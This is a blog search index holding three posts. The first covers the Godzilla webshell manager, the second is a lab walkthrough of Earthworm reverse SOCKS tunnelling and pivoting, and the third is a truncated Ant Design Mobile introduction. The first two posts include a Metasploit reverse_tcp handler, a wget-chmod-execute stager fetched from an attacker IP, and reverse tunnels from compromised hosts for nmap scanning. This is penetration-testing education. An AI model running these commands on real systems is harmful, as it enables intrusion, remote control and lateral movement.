<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Godzilla</title>
      <link href="/2025/01/17/gong-fang-gong-ju-ku/godzilla/"/>
      <url>/2025/01/17/gong-fang-gong-ju-ku/godzilla/</url>
      
        <content type="html"><![CDATA[<h1 id="一、哥斯拉（Godzilla）介绍"><a href="#一、哥斯拉（Godzilla）介绍" class="headerlink" title="一、哥斯拉（Godzilla）介绍"></a>一、哥斯拉（Godzilla）介绍</h1><p>哥斯拉（Godzilla）是一款功能强大的Webshell管理工具，它支持多种类型的Webshell，并且具备通信流量加密的能力。该工具由Java语言开发，内置了3种Payload以及6种加密器，支持6种脚本后缀，并提供了20个内置插件。哥斯拉的shell能绕过市面上大部分的静态查杀，其流量加密措施也能绕过绝大部分的流量WAF。此外，哥斯拉自带的插件功能丰富，包括内存shell管理、屏幕截图、虚拟终端等，这些功能是其他工具如冰蝎、蚁剑所不能比拟的。</p><h1 id="二、安装使用"><a href="#二、安装使用" class="headerlink" title="二、安装使用"></a>二、安装使用</h1><p>地址 <a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla</a> </p><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2011.07.59.png" style="zoom:50%;"><p>下载jar包就行了。</p><p>运行环境： </p><ol><li>JavaDynamicPayload -&gt; java1.0及以上</li><li>CShapDynamicPayload -&gt; .net2.0及以上</li><li>PhpDynamicPayload -&gt; 4.3.0及以上</li><li>AspDynamicPayload -&gt; 全版本</li></ol><p>双击jar包运行即可。</p><h1 id="三、实战使用"><a href="#三、实战使用" class="headerlink" title="三、实战使用"></a>三、实战使用</h1><p>参考本站《通达OA漏洞探测及利用》一文。</p><ul><li>漏洞利用</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go exp <span class="token parameter variable">-u</span> http://192.168.52.30:8080/ <span class="token parameter variable">-i</span> Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.28.33.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.52.50.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.53.31.png" style="zoom:50%;"><p>成功getshell!</p><ul><li>上线Meterpreter</li></ul><p>选择PMeterpreter模块，设置为攻击机的ip和监听端口。</p><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.41.55.png" style="zoom:50%;"><p>攻击机设置msf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0.0</span>.0.0msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">12345</span>lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">12345</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.34.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.52.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell管理 </tag>
            
            <tag> 哥斯拉 </tag>
            
            <tag> Godzilla </tag>
            
            <tag> 攻防工具库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Earthworm-隧道搭建</title>
      <link href="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/"/>
      <url>/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Earthworm简介"><a href="#一、Earthworm简介" class="headerlink" title="一、Earthworm简介"></a>一、Earthworm简介</h1><p>Earthworm（简称EW）是一款轻量便携且功能强大的网络穿透工具，基于标准C开发。它具有SOCKS v5服务架设和端口转发两大核心功能，可以在复杂网络环境下完成网络穿透。Earthworm能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处。该工具支持多平台间的转接通讯，包括Linux、Windows、MacOS、Arm-Linux等操作系统。</p><p>Earthworm 工具包中提供了多种可执行文件，以适应不同的操作系统。它支持全平台(Windows/Linux/Mac)，且能够穿透复杂的内网环境，同时也不需要跳板机运行web服务。</p><p>Earthworm 有六种模式，分别是：ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，这些模式分别对应不同的网络穿透场景和需求。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>主页地址：<a href="https://rootkiter.com/EarthWorm/">https://rootkiter.com/EarthWorm/</a></p><h1 id="二、使用方法"><a href="#二、使用方法" class="headerlink" title="二、使用方法"></a>二、使用方法</h1><h2 id="2-1-普通网络环境"><a href="#2-1-普通网络环境" class="headerlink" title="2.1  普通网络环境"></a>2.1  普通网络环境</h2><h3 id="2-1-1-目标网络边界存在公网IP且可任意开监听端口"><a href="#2-1-1-目标网络边界存在公网IP且可任意开监听端口" class="headerlink" title="2.1.1 目标网络边界存在公网IP且可任意开监听端口"></a>2.1.1 目标网络边界存在公网IP且可任意开监听端口</h3><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.30.13.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span>./ew <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">8888</span> // 在 <span class="token number">1.1</span>.1.1 主机上通过这个命令开启 <span class="token number">8888</span> 端口的 socks 代理b<span class="token punctuation">)</span> HackTools 可通过访问 <span class="token number">1.1</span>.1.1:8888 端口使用 <span class="token number">1.1</span>.1.1 主机提供的代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-1-2-目标网络边界不存在公网-IP，需要通过反弹方式创建-socks-代理"><a href="#2-1-2-目标网络边界不存在公网-IP，需要通过反弹方式创建-socks-代理" class="headerlink" title="2.1.2 目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理"></a>2.1.2 目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理</h3><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.33.38.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span> ./ew <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>// 在 <span class="token number">1.1</span>.1.1 的公网主机添加转接隧道，将 <span class="token number">1080</span> 收到的代理请求转交给反连 <span class="token number">8888</span> 端口的主机b<span class="token punctuation">)</span> ./ew <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">1.1</span>.1.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span>          // 将目标网络的可控边界主机反向连接公网主机c<span class="token punctuation">)</span> HackTools 可通过访问 <span class="token number">1.1</span>.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-二重网络环境"><a href="#2-2-二重网络环境" class="headerlink" title="2.2 二重网络环境"></a>2.2 二重网络环境</h2><h3 id="2-2-1-情形1"><a href="#2-2-1-情形1" class="headerlink" title="2.2.1 情形1"></a>2.2.1 情形1</h3><p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p><ul><li>A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源</li><li>B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</li><li>A 主机可直连 B 主机</li></ul><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.41.25.png" style="zoom:50%;"><pre class="line-numbers language-none"><code class="language-none">a)  ./ew -s ssocksd -l 9999// 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-2-情形2"><a href="#2-2-2-情形2" class="headerlink" title="2.2.2 情形2"></a>2.2.2 情形2</h3><p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p><ul><li><p>A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。</p></li><li><p>B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。</p></li><li><p>A 主机可直连 B 主机</p></li></ul><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2013.44.27.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>// 在 <span class="token number">1.1</span>.1.1 公网主机添加转接隧道，将 <span class="token number">1080</span> 收到的代理请求转交给反连 <span class="token number">8888</span> 端口的主机b<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">9999</span>// 在 <span class="token number">2.2</span>.2.3 主机上利用 ssocksd 方式启动 <span class="token number">9999</span> 端口的 socks 代理c<span class="token punctuation">)</span>  ./ew <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">1.1</span>.1.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span> <span class="token parameter variable">-f</span> <span class="token number">2.2</span>.2.3 <span class="token parameter variable">-g</span> <span class="token number">9999</span>// 在 <span class="token number">2.2</span>.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 <span class="token number">2.2</span>.2.3:9999 之间的通讯隧道d<span class="token punctuation">)</span>  HackTools 可通过访问 <span class="token number">1.1</span>.1.1:1080 来使用 <span class="token number">2.2</span>.2.3 主机提供的 socks5 代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-参数说明"><a href="#2-3-参数说明" class="headerlink" title="2.3 参数说明"></a>2.3 参数说明</h2><p>目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:</p><ul><li>ssocksd   </li><li>rcsocks   </li><li>rssocks  </li><li>lcx_slave </li><li>lcx_tran  </li><li>lcx_listen</li></ul><p>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。</p><p>其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。</p><p>lcx 类别管道：</p><ul><li>lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</li><li>lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</li><li>lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</li></ul><p>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</p><p>下面是一个三级跳的本地测试例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span>./ew <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-e</span> <span class="token number">8888</span> <span class="token parameter variable">-f</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-g</span> <span class="token number">9999</span>./ew <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">9999</span> <span class="token parameter variable">-e</span> <span class="token number">7777</span>./ew <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-e</span> <span class="token number">7777</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>   数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks </p><h2 id="2-4-rcsocks-和-rssocks的区别"><a href="#2-4-rcsocks-和-rssocks的区别" class="headerlink" title="2.4 rcsocks 和 rssocks的区别"></a>2.4 rcsocks 和 rssocks的区别</h2><ul><li><code>rcsocks</code> 是反向 socks 代理客户端模式。在这种模式下，客户端设置监听端口，将收到的代理请求转交给反连的被控服务器。例如，可以在代理客户端设置监听端口，将6666收到的代理请求转交给反连8888端口的被控服务器。</li><li><code>rssocks</code> 是反向 socks 代理服务端模式。在这种模式下，创建反向 socks 代理服务端，适用于目标机器没有公网 IP，但可访问内网资源的场景。它将本机的代理流量反向代理到指定的主机和端口，例如在被控主机2启动SOCKS v5代理服务端，并反弹到被控主机1的9999端口。</li></ul><h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>在对某个三层网络环境的靶场进行渗透的过程中，当拿下DMZ区和二层网络各一台主机后，通过搭建隧道，建立攻击机对二层网络主机的访问通道。</p><p>网络环境大致如下：</p><p>【攻击机192.168.43.26】——&gt;【DMZ 192.168.43.253｜192.168.52.10)】——&gt;【二层 192.168.52.20】</p><p>这里是在本机搭建的环境，在实际攻击场景中攻击机一般是互联网上一台拥有公网ip的VPS，DMZ对外的IP也是互联网IP。</p><p>需求：建立攻击机和二层主机的隧道，实现直接在攻击机中使用nmap对二层网络中的主机进行扫描。</p><ul><li>攻击机：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><code>-s rcsocks</code>：指定使用 <code>rcsocks</code> 模式。<code>rcsocks</code> 模式是 Earthworm 的 SOCKS 代理模式，它创建一个 SOCKS 服务器，该服务器接收来自客户端的连接，并将这些连接转发到远程的 SOCKS 服务器。</li><li><code>-l 1080</code>：指定本地监听端口为 1080。这意味着 Earthworm 将在本地计算机的 1080 端口上监听进来的 SOCKS 代理请求。</li><li><code>-e 1234</code>：指定远程 SOCKS 服务器的端口为 1234。这意味着所有通过本地 SOCKS 服务器（监听在 1080 端口）的流量都将被转发到远程 SOCKS 服务器的 1234 端口。</li></ul></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.36.57.png" alt="截屏2025-01-15 14.36.57" style="zoom:40%;"><ul><li>DMZ受控主机：</li></ul><blockquote><p>上传ew_for_linux64</p></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.40.28.png" style="zoom:50%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.41.47.png" style="zoom:50%;"><p>由于已经获得了ssh root权限，所以这里可以直接用scp复制文件到目标系统中。</p><blockquote><p>并执行如下命令：</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.43.26 <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><code>-s rssocks</code>：指定使用 <code>rssocks</code> 模式。<code>rssocks</code> 模式用于创建一个 SOCKS 服务端，它将接收来自远程 SOCKS 客户端的连接，并将这些连接转发到本地的特定端口。</li><li><code>-d 192.168.1.7</code>：指定目标主机的 IP 地址为 <code>192.168.1.7</code>。这意味着 Earthworm 将尝试连接到这个 IP 地址上的 SOCKS 客户端。</li><li><code>-e 1234</code>：指定本地转发端口为 1234。这意味着所有通过远程 SOCKS 客户端的流量都将被转发到本地的 1234 端口。</li></ul></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.42.40.png" style="zoom:50%;"><ul><li>设置proxychains</li></ul><blockquote><h4 id="什么是proxychains"><a href="#什么是proxychains" class="headerlink" title="什么是proxychains"></a>什么是proxychains</h4><p>Proxychains 是一个非常有用的工具，它允许你通过一个或多个代理服务器来运行你的应用程序。它通过劫持应用程序的网络请求，并将这些请求通过配置的代理链发送出去，从而实现网络流量的代理。</p><p>ProxyChains是Linux和其他Unices下的代理工具。它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p><p>设置ProxyChains的具体操作步骤如下所示：</p><ul><li>打开ProxyChains配置文件：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>添加代理服务器</li></ul><p>在配置文件中，找到 <code>[ProxyList]</code> 部分，并添加你的代理服务器信息。以下是一些示例配置：</p><p><strong>SOCKS5 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.100 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>HTTP 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">http 192.168.1.101 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SOCKS4 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.1.102 9050<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你可以添加多个代理，Proxychains 会根据配置的规则使用这些代理。</p><ul><li>配置代理链模式</li></ul><p>在配置文件的顶部，你可以选择不同的代理链模式：</p><p>动态链 (<code>dynamic_chain</code>)**：Proxychains 将按顺序尝试每个代理，直到找到一个工作的代理。</p><p>**严格链 (<code>strict_chain</code>)**：Proxychains 将按顺序尝试每个代理，如果一个代理失败，它将停止尝试。</p><p>例如，要启用动态链模式，你可以在配置文件的顶部添加或确保以下行未被注释（即没有 <code>#</code> 在行首）：</p><pre class="line-numbers language-none"><code class="language-none">dynamic_chain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>保存并退出编辑器</li></ul><p>保存更改并退出编辑器。如果你使用的是 <code>nano</code>，可以按 <code>Ctrl + X</code>，然后按 <code>Y</code> 确认保存更改，最后按 <code>Enter</code> 保存文件。</p><ul><li>使用 Proxychains</li></ul><p>现在，你可以通过在命令前加上 <code>proxychains</code> 来使用 Proxychains。例如，使用 <code>proxychains</code> 运行 <code>curl</code> 命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将通过你配置的代理服务器发送请求。</p></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.07.png" alt="原配置" style="zoom:40%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.57.png" alt="原配置" style="zoom:50%;"><p>修改后的配置：</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.56.34.png" style="zoom:50%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.57.10.png" style="zoom:40%;"><p>之后便可以使用proxychains将我们攻击机上的程序代理进第二层网络（192.168.52.1/24）了。</p><p>比如用curl访问内网主机的web服务：</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.13.23.png" style="zoom:50%;"><p>成功从kali访问到了内网主机的web服务。</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.19.00.png" style="zoom:40%;"><p>正常情况下ping内网主机是无法ping通的，但是proxychains不支持icmp协议，所以也没法使用诸如proxychains4 ping 192.168.52.20的命令测试连通性。</p><ul><li>msf配置路由</li></ul><p>使用 msf exploit/multi/script/web_delivery模块创建反弹shell的payload，投递到DMZ受控主机中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> SRVPORT <span class="token number">9090</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> xDfaOgFL --no-check-certificate http://192.168.43.26:9090/plurgt4DqlP<span class="token punctuation">;</span> <span class="token function">chmod</span> +x xDfaOgFL<span class="token punctuation">;</span> ./xDfaOgFL<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.54.38.png" alt="截屏2025-01-15 15.54.38"></p><p> 执行之后上线meterpreter：</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.55.00.png" style="zoom:40%;"><p>设置路由：</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.56.25.png" style="zoom:50%;"><p>通过添加路由可以将msfconsole路由到内网中。</p><p>我们尝试使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.1-255<span class="token builtin class-name">set</span> threads <span class="token number">5</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.03.09.png" alt="截屏2025-01-15 16.03.09" style="zoom:50%;"><p>​       成功探测到一台计算机：192.168.52.30.</p><p>使用proxychains代理攻击机的流量，实现对二层网络的探测：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-F</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.52.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="大战Bug-「proxychains4-nmap-报错」"><a href="#大战Bug-「proxychains4-nmap-报错」" class="headerlink" title="大战Bug-「proxychains4 nmap  报错」"></a>大战Bug-「proxychains4 nmap  报错」</h4><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.08.46.png" alt="截屏2025-01-15 16.08.46" style="zoom:50%;"><p>解决：</p><p>编辑 /etc/proxychains4.conf</p><p>注释掉dns解析代理</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.11.13.png" alt="截屏2025-01-15 16.11.13" style="zoom:50%;"></blockquote><p>重新执行扫描</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.16.08.png" style="zoom:50%;"><p>扫描结果：</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.17.06.png" style="zoom:50%;"><p>至此，成功实现借助隧道使用kali的攻击工具探测二层网络内系统信息。</p><p>流量路径大致如下：</p><p>kali（nmap）192.168.43.26——&gt;127.0.0.1:8080——&gt;192.168.43.253:1234——&gt;192.168.52.10——&gt;192.168.52.30</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> 隧道搭建 </tag>
            
            <tag> Earthworm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntDesignMobile组件</title>
      <link href="/2025/01/09/qian-hou-duan-kai-fa/antdesignmobile-zu-jian/"/>
      <url>/2025/01/09/qian-hou-duan-kai-fa/antdesignmobile-zu-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是Ant-Design-Mobile"><a href="#一、什么是Ant-Design-Mobile" class="headerlink" title="一、什么是Ant Design Mobile"></a>一、什么是Ant Design Mobile</h1><p>Ant Design Mobile是由支付宝设计团队基于蚂蚁集团的众多业务实践和亿万用户的验证反馈，抽象构建出的移动端UI组件库。它是Ant Design的移动端版本，专注于为移动端应用和网页设计提供一套丰富且易于使用的组件。Ant Design Mobile基于React技术栈开发，支持TypeScript，并遵循Ant Design的设计规范。</p><p>Ant Design Mobile适用于各种类型的移动应用开发项目，无论是企业级应用还是个人项目，都可以通过其丰富的组件库快速构建出功能完备、美观易用的移动端界面。它帮助开发者和设计师将创意快速转化为实际应用，提升开发效率和用户体验。</p><h1 id="二、主要特点"><a href="#二、主要特点" class="headerlink" title="二、主要特点"></a>二、主要特点</h1><ul><li><strong>高性能</strong>：无需复杂配置，即可拥有最佳的包体积大小和最优的性能。</li><li><strong>可定制</strong>：基于CSS变量，可以灵活地调整组件外观或自由创造自己的主题。</li><li><strong>原子化</strong>：每个组件提供的功能恰到好处地满足业务所需。</li><li><strong>流畅</strong>：拥有流畅的手势交互和细致的动画展示，助力打造极致的用户体验。</li><li><strong>美观易用</strong>：遵循精心设计的视觉规范，拥有简洁美观的外观和易于使用的交互体验，适用于iOS和Android用户。</li><li><strong>快速开发</strong>：提供了大量现成的UI组件和模板，使得开发过程更加高效。</li></ul><h1 id="三、antd-mobile和antd有什么区别？"><a href="#三、antd-mobile和antd有什么区别？" class="headerlink" title="三、antd-mobile和antd有什么区别？"></a>三、antd-mobile和antd有什么区别？</h1><p>Ant Design（简称antd）和Ant Design Mobile（简称antd-mobile）都是由蚂蚁金服设计团队开发的UI组件库，但它们在设计目标和应用场景上有所不同：</p><h2 id="3-1-设计目标和应用场景"><a href="#3-1-设计目标和应用场景" class="headerlink" title="3.1 设计目标和应用场景"></a>3.1 设计目标和应用场景</h2><ul><li><strong>Ant Design（antd）</strong>：<ul><li>主要针对<strong>PC端</strong>和<strong>平板浏览器</strong>设计。</li><li>提供了丰富的桌面端UI组件，适用于构建企业级的Web应用。</li></ul></li><li><strong>Ant Design Mobile（antd-mobile）</strong>：<ul><li>专注于<strong>移动端浏览器</strong>。</li><li>提供了适合移动端使用的轻量级UI组件，适用于构建移动端Web应用。</li></ul></li></ul><h2 id="3-2组件差异"><a href="#3-2组件差异" class="headerlink" title="3.2组件差异"></a>3.2组件差异</h2><ul><li><strong>组件类型和交互方式</strong>：<ul><li><strong>antd</strong>的组件更符合桌面端用户的交互习惯，例如使用鼠标点击、拖拽等操作。</li><li><strong>antd-mobile</strong>的组件则更注重移动端用户的交互体验，如手指滑动、触摸等操作。</li></ul></li><li><strong>组件的外观和布局</strong>：<ul><li><strong>antd</strong>的组件通常具有较大的尺寸和间距，以适应桌面屏幕的显示。</li><li><strong>antd-mobile</strong>的组件则设计得更加紧凑，以适应移动设备的屏幕尺寸。</li></ul></li></ul><h1 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h1><h2 id="4-1-安装"><a href="#4-1-安装" class="headerlink" title="4.1 安装"></a>4.1 安装</h2><pre class="line-numbers language-bash" data-language="bash"><code 